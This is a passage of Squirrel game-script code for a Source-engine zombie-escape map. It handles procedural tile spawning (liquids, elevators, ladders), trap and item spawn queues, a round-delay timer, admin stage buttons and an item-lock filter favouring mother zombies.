			if(mirrored && current_dir!="west" && current_dir!="east")yaw += 180;
			rot.y = (0+yaw+180);
		}
		else if(::TYPES[index].name=="LIQUID_TUNNELWALL" || ::TYPES[index].name=="HAZLIQUID_TUNNELWALL")
		{
			local twmodel = ::TILEVARIANTS[::TYPES[index].name][::THEME].tunnelwallblock[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].tunnelwallblock.len()-1)];
			local sq = {index=25,spawnindex=(0+mapspawnindex),color=color,modelname=twmodel};if(::THEME=="generic")sq.isgeneric<-true;
			endspawnqueue.push({
					_sq = sq,
					_pos = spawndata.pos,
					function Run()
					{
						::SpawnQueue.push(_sq);
						::SpawnQueueSpawner.push(_pos+Vector(0,0,8));
					}
				});
		}
		else if(::TYPES[index].name=="LIQUID_SHALLOW" || ::TYPES[index].name=="HAZLIQUID_SHALLOW")
		{
			is_shallow = true;
			if(::TYPES[index].name=="HAZLIQUID_SHALLOW")
				is_shallow_haz = true;
		}
		endspawnqueue.push({
				_index = index, //__CSS__thisified
				_mapspawnindex = mapspawnindex,
				_rot = rot,
				_liquid_drown = liquid_drown,
				_pos = spawndata.pos,
				_is_shallow = is_shallow,
				_is_shallow_haz = is_shallow_haz,
				function Run()
				{
					if(this._is_shallow && !::LIQUID_SHALLOW_WSPAWN)
					{
						if(this._is_shallow_haz)
						{
							::Ent(Vector()+this._pos,Vector(),"trigger_push",{
									targetname = "block_"+(0+this._mapspawnindex).tostring()+"_liquid",
									pushdir = "0 0 0",
									speed = 0.01,
									spawnflags = 1,
								},{
								themehurtlogic = ""+::THEME,
								tries = 10,
								function Tick(){
										//EntFireByHandle(self,"RunScriptCode",
										//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
										//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,100,::LIQUID_TICKRATE+0.05); ",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode"," Tick(); ",::LIQUID_TICKRATE,null,null);
									EntFireByHandle(self,"Disable","",0.00,null,null);
									EntFireByHandle(self,"Enable","",::LIQUID_ENABLE_DELAY,null,null);
								},function Touch(){
									local toucher = activator;	//__CSS__ activator may get reset, store toucher
									if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
									toucher.ValidateScriptScope();
									if("liquid_hurtcd" in toucher.GetScriptScope())return;
									toucher.GetScriptScope().liquid_hurtcd <- true;
									EntFireByHandle(toucher,"RunScriptCode"," if(\"liquid_hurtcd\" in this)delete liquid_hurtcd; ",::LIQUID_HURT_CD,null,null);
									local newhp = (toucher.GetHealth()-::THEMES[this.themehurtlogic].hazliquid_damage);
									::THEMES[this.themehurtlogic].HazliquidHurtLogic(toucher);
									if(newhp > 500)toucher.SetHealth(newhp);
									else EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
								},
								function RunParentSet()
								{
									tries--;
									if(tries <= 0)return;
										//DebugDrawBoxAngles(self.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),Vector(),0,0,255,100,1.00);
									//local blockmaster = Entities.FindByClassnameNearest("prop_physics_override",self.GetOrigin(),16);
									local blockmaster = Entities.FindByClassnameNearest("prop_dynamic",self.GetOrigin(),16);		//__CSS__ no more physics
										//printl("-------------BLOCKMASTER> "+blockmaster);
									if(blockmaster==null||!blockmaster.IsValid())
									{
										EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",1.00,null,null);
										return;
									}
									EntFireByHandle(self,"SetParent","!activator",0.00,blockmaster,null);
										//EntFireByHandle(blockmaster,"AddOutput","rendercolor 255 0 0",0.00,null,null);
										//DebugDrawBoxAngles(blockmaster.GetOrigin(),Vector(-2,-2,-2),Vector(2,2,2),Vector(),255,0,0,100,10.00);
								},
								function Run(){
									
									//__CSS__ new push (old mins/max was 32.5)
									self.SetSize(Vector(-32,-32,-240),Vector(32,32,0));
									
									//EntFireByHandle(self,"AddOutput","mins "+"-32.5 -32.5 -240",0.00,null,null);
									//EntFireByHandle(self,"AddOutput","maxs "+"32.5 32.5 0",0.00,null,null);
									//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									
									
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
									if(::LIQUID_DOPARENT)EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",0.55,null,null);
								}});
						}
					}
					else
					{
						::liquid_spawnqueue.push({type=::TYPES[this._index].name,targetname="block_"+(0+this._mapspawnindex).tostring()+"_liquid",
							rot=this._rot,drown=this._liquid_drown});
						::liquidspawnqueuespawn.push({pos=Vector()+this._pos,rot=this._rot});
					}
				}
			});
		spawndata.yaw = rot.y;
	}
	else if(::TYPES[index].name.find("ELEVATOR")==0)
	{
		local movedir = Vector(-90,0,0);
		local elevation_floor = 9999;
		local elevation_top = -9999;
		local elevator_movedist = 0;
		local spawnfloor = true;
		local checks = ["left","right","up","down"];
		foreach(c in checks)
		{
			local nindex = GetMapNeighborIndex(map,x,y,c);
			if(nindex==null)continue;
			local nelevation = GetElevation(nindex);
			if(nelevation==null)continue;
			if(nelevation < elevation_floor)elevation_floor = (0+nelevation);
			if(nelevation > elevation_top)elevation_top = (0+nelevation);
		}
		local elevator_dist = (elevation_top-elevation_floor);
		local elevator_dist_manual = false;
		if(abs(elevator_dist)>10000 || abs(elevator_dist)==0)
		{
			elevator_dist = 0;
			elevator_dist_manual = true;
			if(elevation_floor > 9000)	//no surrounding floors, move up/down between elevation 1-20
			{
				elevation_floor = 1;
				elevator_movedist = (ELEVATION*19);
				spawnfloor = false;
			}
			else
			{
				spawnfloor = false;	//don't spawn a floor here, only spawn floor in normal/valid up/down elevations
				local sidevariants = [];
				local checks = [{	dir="left",		xofs= -1,		yofs= 0,		rotdir=Vector(0,180,0)		},
								{	dir="right",	xofs= 1,		yofs= 0,		rotdir=Vector(0,0,0)		},
								{	dir="up",		xofs= 0,		yofs= 1,		rotdir=Vector(0,90,0)		},
								{	dir="down",		xofs= 0,		yofs= -1,		rotdir=Vector(0,270,0)		}];
				foreach(c in checks)
				{
					local iteration_dist = 0;
					local itx = (0+x);
					local ity = (0+y);
					for(local i=0;i<MAP_SIZE;i++)
					{
						local nindex = GetMapNeighborIndex(map,itx,ity,c.dir);
						if(nindex==null)break;	//edge of map	- give up
						if(nindex==1)break;		//wall			- give up
						iteration_dist++;
						local nelevation = GetElevation(nindex);
						if(nelevation!=null)
						{
							if(iteration_dist<=1)
								break;
							if(nelevation == elevation_floor)
							{
								if(sidevariants.len()<=0)
									sidevariants.push({dir=c.rotdir,iterations=(0+iteration_dist),dist=(iteration_dist-1)});
								else if(iteration_dist <= sidevariants[0].iterations)
								{
									if(iteration_dist < sidevariants[0].iterations)	//if current one is shorter, clear list, prioritize shortest, randomize if multiple shortest
										sidevariants.clear();
									sidevariants.push({dir=c.rotdir,iterations=(0+iteration_dist),dist=(iteration_dist-1)});
								}
								break;
							}
						}
						itx += c.xofs;
						ity += c.yofs;
					}
				}
				if(sidevariants.len()<=0)
				{
					//return;		//OLD< abort completely		NEWv going up/down between elevation 1 > floor-elevation
						//if only one valid elevation-neighbor is found:
						//- go from elevation-1 to the valid elevation
						//- if valid elevation IS 1, then go from valid elevation to elevation-20
						//- spawn no floor
					if(elevation_floor == 1)
						elevator_movedist = (ELEVATION*19);
					else
					{
						elevation_floor = 1;
						elevation_top--;
						if(elevation_top<=1)
							elevator_movedist = (ELEVATION*19);
						else
							elevator_movedist = (ELEVATION*elevation_top);
					}
				}
				else
				{
					local side = sidevariants[RandomInt(0,sidevariants.len()-1)];
					movedir = side.dir;
					elevator_movedist = (GRID_SIZE * side.dist);
				}
			}
		}
		elevation = (0+elevation_floor);
		spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
		if(!elevator_dist_manual)
			elevator_movedist = (ELEVATION*elevator_dist);
		if(elevator_movedist<=0.01)elevator_movedist=0.01;
		endspawnqueue.push({
				spawndata = spawndata,
				movedir = movedir,
				elevator_movedist = elevator_movedist,
				_mapspawnindex = mapspawnindex,
				function Run()
				{
					::movelinear_spawnqueue.push({
							position		=	Vector(),
							origin			=	""+spawndata.pos.x.tostring()+" "+spawndata.pos.y.tostring()+" "+spawndata.pos.z.tostring(),
							movedir			=	movedir.x.tostring()+" "+movedir.y.tostring()+" "+movedir.z.tostring(),
							movedistance	=	elevator_movedist.tostring(),
							speed			=	RandomFloat(::THEMES[::THEME].elevator_speed_min,::THEMES[::THEME].elevator_speed_max).tostring(),
							startsound		=	"",
							stopsound		=	"",
							targetname		=	"block_"+(0+_mapspawnindex).tostring(),
							child			=	null,
							child_handled	=	false,
							inverted 		= 	false,
						});
				}
			});
		if(spawnfloor)
		{
			local nfdata = GetNeighboringFloorData(map,x,y,25,true);
			spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation_floor);
			local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
			endspawnqueue.push({
					_sq = sq,
					spawndata = spawndata,
					function Run()
					{
						::SpawnQueue.push(_sq);
						::SpawnQueueSpawner.push(Vector(spawndata.pos.x,spawndata.pos.y,spawndata.pos.z-1));
					}
				});
		}
		spawndata.pos.z += 1;
	}
	else if(::TYPES[index].name=="LADDER"||::TYPES[index].name.find("CLIMB")==0)
	{
		local rots = [];
		local lowest_elev = (0+elevation);
		local highest_elev = (0+elevation);
		local checks = [
			{	dir= "left",		yaw= 180,			xofs= -1,		yofs= 0			},
			{	dir= "right",		yaw= 0,				xofs= 1,		yofs= 0			},
			{	dir= "up",			yaw= 90,			xofs= 0,		yofs= 1			},
			{	dir= "down",		yaw= 270,			xofs= 0,		yofs= -1		},
		];
		foreach(c in checks)
		{
			local nindex = GetMapNeighborIndex(map,x,y,c.dir);
			local nelevation = GetElevationFromNeighbors(map,x,y,true,c.dir,-500);
			if(nindex != null && nelevation != null && nelevation > -5)
			{
				if(::TYPES[nindex].name=="FLOOR" || ::TYPES[nindex].name=="PLATFORM" || ::TYPES[nindex].name=="FLOORCEILING" || ::TYPES[nindex].name=="FLOORCEILINGTALL")
				{
					if(nelevation < elevation)
						lowest_elev = (0+nelevation);
					else// if(nelevation > (2+elevation))		//<old, confirm that replacement below works (or actually nah this is working fine?)
					//else if(nelevation > (2+elevation))		//this should prevent climb+ladder from requesting a spawn when actually not needed
					{
						if(nelevation >= highest_elev)
						{
							if(nelevation > highest_elev)
								rots.clear();
							rots.push(c.yaw);
							highest_elev = (0+nelevation);
						}
					}
				}
			}
		}
		elevation = (0+lowest_elev);
		local just_spawn_floor = false;
		local differing_elevations = false;
		if(lowest_elev!=highest_elev)differing_elevations = true;
		if(highest_elev <= (2+lowest_elev) && differing_elevations)		//small elevation-difference, not worth spawning a ladder/climb
		//if(highest_elev <= (1+lowest_elev) && differing_elevations)		//small elevation-difference, not worth spawning a ladder/climb (1: makes it safe for slopes)
		{
			just_spawn_floor = true;
			rots.clear();
		}
		if(just_spawn_floor || rots.len()>0 && differing_elevations)	//spawn a floor here
		{
			local nfdata = GetNeighboringFloorData(map,x,y,25,true,true);
			spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
			local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
			endspawnqueue.push({
					_sq = sq,
					_pos = spawndata.pos,
					function Run()
					{
						::SpawnQueue.push(_sq);
						::SpawnQueueSpawner.push(_pos);
					}
				});
		}
		else if(rots.len()<=0)
		{
			highest_elev = 20;											//no valid neighbors at all, set elevation to 20
			local wallcands = [];										//check for nearby WALL tiles, that could be used for rot
			local checks = [
				{	dir= "left",		yaw= 180,	},
				{	dir= "right",		yaw= 0,		},
				{	dir= "up",			yaw= 90,	},
				{	dir= "down",		yaw= 270,	},
			];
			foreach(c in checks)
			{
				local nindex = GetMapNeighborIndex(map,x,y,c.dir);
				if(nindex!=null && nindex==1)wallcands.push(c);
			}
			foreach(wc in wallcands){rots.push(wc.yaw);}				//if it exists, good! if not, then randomize it
		}
		//else 															//same elevation or only one neighbor - spawn no floor
		if(just_spawn_floor)return;										//small elevation-difference, not worth spawning a ladder/climb RETURN
		elevation = highest_elev-20;
		spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
		spawndata.pos.z += 1;
		if(rots.len()<=0)rots = [0,90,180,270];							//randomize rots here as last-resort
		spawndata.yaw = rots[RandomInt(0,rots.len()-1)]+180;
		if(::TYPES[index].name=="LADDER")
		{
			endspawnqueue.push({
					_mapspawnindex = mapspawnindex,
					spawndata = spawndata,
					function Run()
					{
						::ladder_spawnqueue.push({targetname="block_"+(0+_mapspawnindex).tostring()});
						::ladderspawnqueuespawn.push({pos=spawndata.pos,rot=Vector(0,spawndata.yaw+180,0)});
					}
				});
		}
	}
	if(bridgelowest!=null)spawndata.pos = bridgelowest;
	local sq = {index=index,spawnindex=(0+mapspawnindex),color=color,modelname=model,crackbody=crackbody,
		breakable=breakable,epress=epress,holdnameaffix=holdnameaffix,angleslope=angleslope};if(::THEME=="generic")sq.isgeneric<-true;
		if(trapfloor)
		{
			sq.trapfloor <- true;
			local nfdata = GetNeighboringFloorData(map,x,y,25,false,true);	//generic_trapfloor_color_fix
			sq.index = nfdata.index;
		}
	endspawnqueue.push({
			sq = sq,
			spawndata = spawndata,
			function Run()
			{
				::SpawnQueue.push(sq);
				::SpawnQueueSpawner.push(spawndata);
			}
		});
	::process_stage.push({queue=endspawnqueue});
}

//=========================================================================================================================================================\\
::liquidspawnqueuespawn <- [];
::modelspawnqueuespawn <- [];
::ladderspawnqueuespawn <- [];
::boostpadspawnqueuespawn <- [];
::SpawnQueueItem <- [];
::SpawnQueueTrap <- [];


function TickSpawnQueueTraps()
{
	if(::SpawnQueueTrap.len()>0)
	{
		::SpawnQueueTrap = ::ScrambleArray(::SpawnQueueTrap);
		local pos = ::SpawnQueueTrap[0].pos;
		local type = ::SpawnQueueTrap[0].type;
		::SpawnQueueTrap.remove(0);
		if(::DISABLE_TRAPS)return;
		if(type == "TRAPRANDOM")
		{
			local types = ["TRAPSTEP","TRAPVICINITY","TRAPSPAWN"];
			type = types[RandomInt(0,types.len()-1)];
		}
		local randchance = RandomFloat(0.00,100.00);
		if(	type=="TRAPSTEP" && randchance>::THEMES[::THEME].trapstep_chance ||
			type=="TRAPVICINITY" && randchance>::THEMES[::THEME].trapvicinity_chance ||
			type=="TRAPSPAWN" && randchance>::THEMES[::THEME].trapspawn_chance){}else{
				local angs = [0,90,180,270];
				local template = null;
				local rtable = null;
				if(type=="TRAPSTEP")
				{
					if(::THEMES[::THEME].traps_step == null)
						rtable = global_traps_step[RandomInt(0,global_traps_step.len()-1)];
					else
						rtable = ::THEMES[::THEME].traps_step[RandomInt(0,::THEMES[::THEME].traps_step.len()-1)];
				}
				else if(type=="TRAPVICINITY")
				{
					if(::THEMES[::THEME].traps_vicinity == null)
						rtable = global_traps_vicinity[RandomInt(0,global_traps_vicinity.len()-1)];
					else
						rtable = ::THEMES[::THEME].traps_vicinity[RandomInt(0,::THEMES[::THEME].traps_vicinity.len()-1)];
				}
				else if(type=="TRAPSPAWN")
				{
					if(::THEMES[::THEME].traps_spawn == null)
						rtable = global_traps_spawn[RandomInt(0,global_traps_spawn.len()-1)];
					else
						rtable = ::THEMES[::THEME].traps_spawn[RandomInt(0,::THEMES[::THEME].traps_spawn.len()-1)];
				}
				if(rtable==null)return;
				if(::EstimateNewCost(rtable.cost) > EDICT_LIMIT_TRAPS)return;
					//::EDICTS += rtable.cost;//EDICTS_NOW_ADDED_IN_CREATECOSTCLEANER
				template = rtable.template;
				if((typeof template) == "table")
					template.Spawn(pos);
				else
				{
					local temhandle = Entities.FindByName(null,template);
					if(temhandle==null||!temhandle.IsValid())
						printl("[::SpawnQueueTrap ERROR] - no template: "+template);
					else
					{
						local temmaker = Entities.FindByName(null,template+"_maker");
						if(temmaker==null||!temmaker.IsValid())
						{
							temmaker = Entities.CreateByClassname("env_entity_maker");
							temmaker.__KeyValueFromString("targetname",template+"_maker");
							temmaker.__KeyValueFromString("EntityTemplate",template);
						}
						temmaker.SpawnEntityAtLocation(pos,Vector(0,angs[RandomInt(0,angs.len()-1)],0));
					}
				}
		}
	}
}
getitemcount_cd <- false;
getitemcount_cd_set <- 1.00;
getitemcount_cache <- 0;
function GetItemCount()
{
	if(getitemcount_cd)return (0+getitemcount_cache);
	getitemcount_cd = true;
	EntFireByHandle(self,"RunScriptCode"," getitemcount_cd = false; ",getitemcount_cd_set,null,null);
	local itemcount = 0;
	for(local h;h=Entities.FindByName(h,"item_*");)
	{
		if(h==null||!h.IsValid())continue;
		itemcount++;
	}
	getitemcount_cache = (0+itemcount);
	return (0+getitemcount_cache);
}
function TickSpawnQueueItems()
{
	if(::SpawnQueueItem.len()>0)
	{
		::SpawnQueueItem = ::ScrambleArray(::SpawnQueueItem);
		local pos = ::SpawnQueueItem[0].pos;
		local type = ::SpawnQueueItem[0].type;
		::SpawnQueueItem.remove(0);
		local itemcount = (0+GetItemCount());
		if(itemcount >= ::ITEM_MAX)
		{
			printl("[TickSpawnQueueItems] - total active-item-count is "+itemcount+"/"+::ITEM_MAX+" - aborting new item spawn");
			return;
		}
		getitemcount_cache++;
		local angs = [0];//[0,90,180,270];
		local template = null;
		local rtable = null;
		if(type=="H")
		{
			if(::ITEM_H_DESIRED <= 0)return;
			if(::DISABLE_H_ITEMS)return;
			::ITEM_H_DESIRED--;
			if(::THEMES[::THEME].items_h == null)
			{
				local item = RandomInt(0,global_items_h.len()-1);
				if(::ITEM_ENSURE_HEAL_ORB>0 && Entities.FindByName(null,"item_healorb")==null)
				{
					item=0;::ITEM_ENSURE_HEAL_ORB--;
					if(::ITEM_ENSURE_HEAL_ORB_MESSAGE)
					{
						::ServerSay("say heal-orb spawned due to not existing",0.00,null);
						printl("heal-orb spawned due to not existing");
					}
				}
				rtable = global_items_h[item];
			}
			else
			{
				//not relevant
				rtable = ::THEMES[::THEME].items_h[RandomInt(0,::THEMES[::THEME].items_h.len()-1)];
			}
		}
		else
		{
			if(::ITEM_Z_DESIRED <= 0)return;
			if(::DISABLE_Z_ITEMS)return;
			::ITEM_Z_DESIRED--;
			if(::THEMES[::THEME].items_z == null)
				rtable = global_items_z[RandomInt(0,global_items_z.len()-1)];
			else
				rtable = ::THEMES[::THEME].items_z[RandomInt(0,::THEMES[::THEME].items_z.len()-1)];
		}
		if(rtable==null)return;
		if(::EstimateNewCost(rtable.cost) > EDICT_LIMIT_ITEMS)return;
			//::EDICTS += rtable.cost;//EDICTS_NOW_ADDED_IN_CREATECOSTCLEANER
		template = rtable.template;
		if((typeof template) == "table")
			template.Spawn(pos);
		else
		{
			local temhandle = Entities.FindByName(null,template);
			if(temhandle==null||!temhandle.IsValid())
				printl("[::SpawnQueueItem ERROR] - no template: "+template);
			else
			{
				local temmaker = Entities.FindByName(null,template+"_maker");
				if(temmaker==null||!temmaker.IsValid())
				{
					temmaker = Entities.CreateByClassname("env_entity_maker");
					temmaker.__KeyValueFromString("targetname",template+"_maker");
					temmaker.__KeyValueFromString("EntityTemplate",template);
				}
				temmaker.SpawnEntityAtLocation(pos,Vector(0,angs[RandomInt(0,angs.len()-1)],0));
			}
		}
	}
}
function TickSpawnQueue()		//new in v1_7 - prevents SQQuerySuspend
{
	EntFireByHandle(self,"RunScriptCode"," TickSpawnQueue(); ",0.01,null,null);
	//newthread(_TickSpawnQueue.bindenv(this)).call();		//__CSS__ threading_disabled
	_TickSpawnQueue();
}
function _TickSpawnQueue()
{
	for(local i=0;i<::tickspawnqueue_procamount;i++)
	{
		if(::SpawnQueueSpawner.len()>0)
		{
			try{
				local pos = ::SpawnQueueSpawner[0];
				::SpawnQueueSpawner.remove(0);
				local angs = [0,90,180,270];
				if((typeof pos)=="table")
				{
					angs = [pos.yaw];
					pos = pos.pos;
				}
				maker.SpawnEntityAtLocation(pos,Vector(0,angs[RandomInt(0,angs.len()-1)],0));
			}catch(e){printl("[TickSpawnQueue ERROR ::SpawnQueueSpawner]: "+e);}
		}
		if(::liquidspawnqueuespawn.len()>0)
		{
			try{
				local pos = ::liquidspawnqueuespawn[0].pos;
				local rot = ::liquidspawnqueuespawn[0].rot;
				::liquidspawnqueuespawn.remove(0);
				::liquid_maker.SpawnEntityAtLocation(pos,rot);
			}catch(e){printl("[TickSpawnQueue ERROR ::liquidspawnqueuespawn]: "+e);}
		}
		if(::modelspawnqueuespawn.len()>0)
		{
			try{
				local pos = ::modelspawnqueuespawn[0].pos;
				local rot = ::modelspawnqueuespawn[0].rot;
				::modelspawnqueuespawn.remove(0);
				::model_maker.SpawnEntityAtLocation(pos,rot);
			}catch(e){printl("[TickSpawnQueue ERROR ::modelspawnqueuespawn]: "+e);}
		}
		if(::ladderspawnqueuespawn.len()>0)
		{
			try{
				local pos = ::ladderspawnqueuespawn[0].pos;
				local rot = ::ladderspawnqueuespawn[0].rot;
				::ladderspawnqueuespawn.remove(0);
				::ladder_maker.SpawnEntityAtLocation(pos,rot);
			}catch(e){printl("[TickSpawnQueue ERROR ::ladderspawnqueuespawn]: "+e);}
		}
		if(::boostpadspawnqueuespawn.len()>0)
		{
			try{
				local pos = ::boostpadspawnqueuespawn[0].pos;
				local rot = ::boostpadspawnqueuespawn[0].rot;
				::boostpadspawnqueuespawn.remove(0);
				::boostpad_maker.SpawnEntityAtLocation(pos,rot);
			}catch(e){printl("[TickSpawnQueue ERROR ::boostpadspawnqueuespawn]: "+e);}
		}
		if(::PRIORITIZE_ITEM_VS_TRAP)	//if this global-var is 'true' it will 100% prioritize spawning items BEFORE traps, else it randomizes (below logic)
		{
			try{
				if(::SpawnQueueItem.len()>0)
					TickSpawnQueueItems();
				else
					TickSpawnQueueTraps();
			}catch(e){printl("[TickSpawnQueue ERROR TickSpawnQueueItems-1]: "+e);}
		}
		else
		{
			try{
				if(RandomInt(0,1)==0)		//randomize order for these in order to make it "scrambled/fair", as both gets limited by the same edict-pool
				{
					TickSpawnQueueTraps();
					TickSpawnQueueItems();
				}
				else
				{
					TickSpawnQueueItems();
					TickSpawnQueueTraps();
				}
			}catch(e){printl("[TickSpawnQueue ERROR TickSpawnQueueItems-2]: "+e);}
		}
	}
}
//OLD (removed in v1_4)
//function HazliquidHurtPlayer()
//{
//	if(activator==null||!activator.IsValid()||activator.GetClassname()!="player")return;
//	EntFireByHandle(activator,"AddContext","hurtcooldown:1",0.00,null,null);
//	EntFireByHandle(activator,"RemoveContext","hurtcooldown",HURTCOOLDOWN,null,null);
//}
function TickDelay()
{
	EntFireByHandle(self,"RunScriptCode"," TickDelay(); ",1.00,null,null);
	if(!::delay_check_enabled || !::MOTHER_ZOMBIE_SPAWNED || DEBUG!=null)
	{
		::delay_timer = 0.00;
		::delay_timer_msg = 0.00;
		TickZombieInvincibility_delay = false;
		return;
	}
	::delay_timer += 1.00;
	::delay_timer_msg += 1.00;
	if(::delay_timer >= ::DELAY_TIMEOUT_SLAY)
	{
		::delay_check_enabled = false;
		EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",0.00,null);
		::ServerSay("say [DELAY] you are taking too long - slaying",0.00,null);
		::ServerSay("say [DELAY] you are taking too long - slaying",0.01,null);
		::ServerSay("say [DELAY] you are taking too long - slaying",0.02,null);
		return;
	}
	if(::delay_timer >= ::DELAY_TIMEOUT)
	{
		if(!::zinvincible_message)
		{
			local pcount = 0;
			for(local h;h=Entities.FindByClassname(h,"player");){pcount++;}
			if(pcount<::delay_check_minplayers)
			{
				::delay_timer = 0.00;
				::delay_timer_msg = 0.00;
				TickZombieInvincibility_delay = false;
				return;
			}
			::ServerSay("say [DELAY] you are taking too long",0.00,null);
			::ServerSay("say [DELAY] zombies are now invincible",0.01,null);
			::ServerSay("say [DELAY] (until progression is made)",0.02,null);
			TickZombieInvincibility_delay = true;
		}
		else if(::delay_message_timer != null)
		{
			if(::delay_timer_msg > ::delay_message_timer)
			{
				
				::ServerSay("say [DELAY] zombies are invincible",0.00,null);
				::ServerSay("say [DELAY] progress or die",0.01,null);
			}
		}
		else
			::delay_timer_msg = 0.00;
		::zinvincible_message = true;
	}
	else
	{
		::zinvincible_message = false;
		::delay_timer_msg = 0.00;
		TickZombieInvincibility_delay = false;
	}
}
function AdminRoomPressed()
{
	local name = caller.GetName();
	name = name.slice(12,name.len());
	local msg = "ADMIN BUTTON PRESSED: "+name;
	printl(msg+" by:"+activator);
	::ServerSay("say "+msg,0.00,null);
	if(name=="slay")
	{
		death_summary_print = false;
		EnableMassKillerAll();
	}
	else if(name=="reset")
	{
		::stage = null;
		::legit_win = true;
		death_summary_print = false;
		::stats_rstat <- [0,0,0,0,0,0];
		::maps_played <- 0;
		::rounds_played <- 0;
		::stats_finale_won <- false;
		::stats_legit_win <- true;
		::stats_infinite_finale_checkout <- 0;
		::stats_infinite_mapindex <- 0;
		::stats_maps_played <- [];
		EnableSpawnKiller();
		EnableMassKillerAll();
	}
	else if(name=="stage1")
	{
		::stage = 0;
		::legit_win = true;
	}
	else if(name=="stage2")
	{
		::stage = 1;
		::legit_win = false;
	}
	else if(name=="stage3")
	{
		::stage = 2;
		::legit_win = false;
	}
	else if(name=="stage4")
	{
		::stage = 3;
		::legit_win = false;
	}
	else if(name=="finale")
	{
		::stage = 4;
		::legit_win = false;
	}
	else if(name=="infinite")
	{
		::stage = 5;
		::legit_win = false;
	}
	::SendCustomEvent("adminbutton_pressed",{presser=activator,button=name});
	try{
		local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
		::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_ADMINBUTTON","sid,"+sid+",button,"+name.tostring()+
				",rounds,"+::rounds_played.tostring()
			);
	}catch(event_e){printl("ZE_COLLECTIVE_ADMINBUTTON ERROR: "+event_e);}
}

::ANTI_ITEM_INFLATE_ACTIVE <- true;		//as long as this is true, no non-MZ's are allowed to get their knife stripped for items
::ANTI_ITEM_INFLATE_TIME <- 20.00;		//once mother-zombies spawn, wait this time before disabling the anti-item-inflate-protection
::ANTI_ITEM_INFLATE_CALLOUT <- true;	//if true: when a z is rejected due to not being MZ while anti-inflate is active, call them out in chat (once per player, per round)
::ITEM_MZ_LOCKTIME <- 7.00;				//null/<=0.00:disable	else float time(seconds) to lock Z-items for non-MZ z's, countdown starts from first touch
::ITEM_MZ_LTGT_CHANNEL <- 2;
::ITEM_MZ_LTGT <- null;
::CreateItemKnifeStripFilter<-function(activator,type,name,holder)	//optional function for ::CreateItem, used to filter/accept/reject knife-stripping
{
	if(activator==null||!activator.IsValid()||activator.IsAlive()==false)return false;									//invalid player				REJECT
	local pcd=::GetPlayerClass(activator);if(pcd==null){}else{if(::DEVID!=null&&::DEVID==pcd.userid)return true;}		//devdebug						ACCEPT
	if(type!=3)return true;																								//not z-item					ACCEPT
	foreach(m in ::MOTHER_ZOMBIES){if(m==activator){return true;}}														//valid mother-zombie			ACCEPT
	if(!::ANTI_ITEM_INFLATE_ACTIVE)
	{
		if(::ITEM_MZ_LOCKTIME == null || ::ITEM_MZ_LOCKTIME <= 0.00)return true;										//locktime disabled				ACCEPT
		holder.ValidateScriptScope();
		if(!("mz_locktime" in holder.GetScriptScope()))
		{
			holder.GetScriptScope().mz_locktime <- (0.00+::ITEM_MZ_LOCKTIME);
			holder.GetScriptScope().MzLockTick <- function()
			{
				if(mz_locktime<=0.00)
				{
					mz_locktime = 0.00;
					return;
				}
				EntFireByHandle(self,"RunScriptCode","MzLockTick();",0.10,null,null);
				mz_locktime -= (0.10+((ceil(0.10/FrameTime()))*FrameTime()-0.10));
			}
			EntFireByHandle(holder,"RunScriptCode","MzLockTick();",0.10,null,null);
		}
		local timeleft = (0.00+holder.GetScriptScope().mz_locktime);
		timeleft = timeleft.tointeger();
		if(timeleft<=0)return true;																						//locktime ran out				ACCEPT
		if(::ITEM_MZ_LTGT==null||!::ITEM_MZ_LTGT.IsValid())
		{
			::ITEM_MZ_LTGT = Entities.CreateByClassname("game_text");
			::ITEM_MZ_LTGT.__KeyValueFromFloat("x",-1);
			::ITEM_MZ_LTGT.__KeyValueFromFloat("y",0.60);
			::ITEM_MZ_LTGT.__KeyValueFromFloat("fadein",0.00);
			::ITEM_MZ_LTGT.__KeyValueFromFloat("fadeout",0.00);
			::ITEM_MZ_LTGT.__KeyValueFromFloat("holdtime",5.00);
			::ITEM_MZ_LTGT.__KeyValueFromInt("channel",::ITEM_MZ_LTGT_CHANNEL);
			::ITEM_MZ_LTGT.__KeyValueFromInt("effect",0);
			::ITEM_MZ_LTGT.__KeyValueFromVector("color",Vector(255,0,0));
		}
		::ITEM_MZ_LTGT.__KeyValueFromString("message","[LOCKED ITEM]\nYou are not a mother zombie\nMother zombies get first priority\nUnlocks for all in "+timeleft.tostring()+"s");
		EntFireByHandle(::ITEM_MZ_LTGT,"Display","",0.00,activator,null);
		return false;																									//locktime still active			REJECT
	}
	if(::ANTI_ITEM_INFLATE_CALLOUT)																						//not valid mother-zombie		REJECT
	{
		activator.ValidateScriptScope();
		if("anti_item_inflate_calledout" in activator.GetScriptScope())return false;
		activator.GetScriptScope().anti_item_inflate_calledout <- true;
		local pc=::GetPlayerClass(activator);if(pc==null){}
		else
		{
